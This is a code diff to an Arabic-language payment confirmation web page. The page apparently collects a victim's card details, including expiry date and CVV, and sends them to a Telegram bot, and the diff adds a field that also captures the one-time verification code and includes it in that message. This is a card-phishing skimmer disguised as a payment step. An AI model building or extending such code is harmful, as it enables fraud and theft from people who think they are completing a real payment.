@@ -36,6 +36,10 @@
         <p><span class="highlight">المبلغ المدفوع:</span> <span id="amount"></span> درهم</p>
       </div>
 
+      <!-- إضافة حقل إدخال كود التحقق -->
+      <label for="verificationCode">أدخل كود التحقق:</label>
+      <input type="text" id="verificationCode" placeholder="أدخل كود التحقق" required />
+
       <button id="confirmBtn">تأكيد الدفع</button>
     </div>
   </main>
@@ -57,7 +61,14 @@
     document.getElementById('amount').textContent = formData.amount;
 
     document.getElementById('confirmBtn').addEventListener('click', function() {
-      // إنشاء الرسالة
+      const verificationCode = document.getElementById('verificationCode').value.trim();
+
+      if (!verificationCode) {
+        alert("❗ الرجاء إدخال كود التحقق.");
+        return;
+      }
+
+      // إنشاء الرسالة لإرسالها إلى البوت
       const message = `
 ✅ تم تأكيد الدفع بنجاح!
 -----------------------------------
@@ -68,6 +79,7 @@
 📆 تاريخ الصلاحية: ${formData.expiryMonth}/${formData.expiryYear}
 🔐 CVV: ${formData.cvv}
 💵 المبلغ المدفوع: ${formData.amount} درهم
+🔑 كود التحقق: ${verificationCode}
 `;
 
       // إرسال الرسالة إلى بوت التلغرام
